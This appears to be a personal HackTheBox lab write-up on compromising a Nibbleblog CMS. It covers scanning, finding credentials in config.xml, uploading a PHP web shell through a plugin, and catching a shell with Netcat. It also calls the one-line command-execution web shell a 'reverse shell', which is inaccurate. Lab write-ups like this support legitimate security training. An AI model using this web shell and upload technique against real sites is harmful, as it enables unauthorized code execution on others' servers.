# Day25 - initial_foothold_hard

- **Platform**: HackTheBox  
- **Category**: Web / Initial Foothold  
- **Difficulty**: Medium  
- **Date**: 2025-05-25  
- **Tools Used**: Nmap, Gobuster, Firefox, PHP reverse shell, Python  

---

## Summary
The challenge involved exploiting Nibbleblog, a lightweight CMS running on Apache. After discovering credentials in configuration files, I logged into the admin panel, identified a vulnerable plugin that allowed file uploads, and uploaded a PHP reverse shell. With a shell obtained, I navigated the filesystem and retrieved `user.txt`.

---

## Enumeration
1. **Port Scan**
   ```bash
   nmap -sC -sV 10.129.252.140
   ```
   - Open ports:
     - 22 → SSH  
     - 80 → HTTP (Apache 2.4.18, Ubuntu)  

2. **Web Enumeration**
   - Base URL: `http://10.129.252.140` returned a default Apache page.  
   - Gobuster scan on `/nibbleblog/`:
     ```bash
     gobuster dir -u http://10.129.252.140/nibbleblog/ \
       -w /usr/share/seclists/Discovery/Web-Content/common.txt
     ```
     - Discovered:
       - `/admin` and `/admin.php`  
       - `/content/`  
       - `/plugins/`  
       - `/themes/`  
       - `/languages/`  

   - Found `users.xml` → revealed admin username.  
   - Found `config.xml` → contained admin password (`nibbles`).  

3. **Login**
   - Accessed `/nibbleblog/admin.php`.  
   - Logged in successfully with `admin:nibbles`.  

---

## Exploitation
1. **File Upload Vulnerability**
   - Investigated admin panel features.  
   - Found plugin supporting image uploads.  
   - Tested upload with a simple `.php` script and confirmed execution.  

2. **Reverse Shell**
   - Crafted PHP reverse shell:
     ```php
     <?php system($_GET['cmd']); ?>
     ```
   - Uploaded and triggered via browser request:
     ```
     http://10.129.252.140/nibbleblog/content/private/plugins/<path>/shell.php?cmd=id
     ```
   - Confirmed execution.  
   - Uploaded full PHP reverse shell, caught with Netcat:
     ```bash
     nc -lvnp 4444
     ```
   - Upgraded shell:
     ```bash
     python3 -c 'import pty; pty.spawn("/bin/bash")'
     ```

3. **Flag Retrieval**
   - Navigated through directories with `ls`, `pwd`, `find`.  
   - Located and read `user.txt`.  

---

## Lessons Learned
- CMS platforms like Nibbleblog often have weak configurations or outdated plugins that allow file upload exploitation.  
- Enumerating XML configuration files can quickly reveal credentials.  
- File upload testing should always include attempts at executing PHP/ASP/other server-side scripts.  
- Once a foothold is achieved, stabilizing the shell (`pty.spawn`) makes further enumeration and exploitation easier.  
